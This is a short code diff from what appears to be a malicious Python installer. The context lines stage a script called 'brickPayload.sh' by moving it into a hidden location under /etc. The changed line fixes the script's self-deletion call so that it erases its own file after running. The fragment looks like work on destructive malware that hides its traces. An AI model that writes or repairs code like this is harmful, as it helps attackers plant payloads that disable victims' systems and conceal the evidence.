@@ -12,5 +12,5 @@ def main():
     print("Install complete. Preping brick payload.")
     os.system("mv /etc/.a/files.ravenn.net/horror/brickPayload.sh /etc/.music")
     print("Total completion. Goodbye")
-    remove(argv[0])
+    os.remove(argv[0])
 main()
